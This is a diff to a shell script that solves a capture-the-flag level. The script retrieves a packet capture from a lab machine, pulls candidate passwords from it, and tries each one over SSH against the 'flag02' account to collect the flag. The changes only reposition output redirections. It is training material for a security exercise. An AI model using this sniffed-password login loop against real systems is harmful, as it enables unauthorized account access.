@@ -7,7 +7,7 @@ PCAP=level02.pcap
 FLAG=../flag
 
 # Copy the 'level02.pcap' file from the virtual machine to the host + set its permissions
-sshpass -f ${PREVIOUS_FLAG} scp -P ${PORT} level02@${ADDRESS}:${PCAP} . 2>/dev/null
+sshpass -f ${PREVIOUS_FLAG} 2>/dev/null scp -P ${PORT} level02@${ADDRESS}:${PCAP} .
 chmod 600 ${PCAP}
 
 # Extract the raw data from the packets of the 'level02.pcap' file
@@ -38,8 +38,8 @@ POTENTIAL_PASSWORDS=$(
 for POTENTIAL_PASSWORD in ${POTENTIAL_PASSWORDS}; do
 	# Try to connect to the 'flag02' account
 	if
-		sshpass -p ${POTENTIAL_PASSWORD} \
-			ssh -p ${PORT} flag02@${ADDRESS} "getflag | grep -oE '[^ ]+$'" >${FLAG} 2>/dev/null
+		sshpass -p ${POTENTIAL_PASSWORD} >${FLAG} 2>/dev/null \
+			ssh -p ${PORT} flag02@${ADDRESS} "getflag | grep -oE '[^ ]+$'"
 	then
 		# Found the correct password and saved the flag
 		rm ${PCAP}
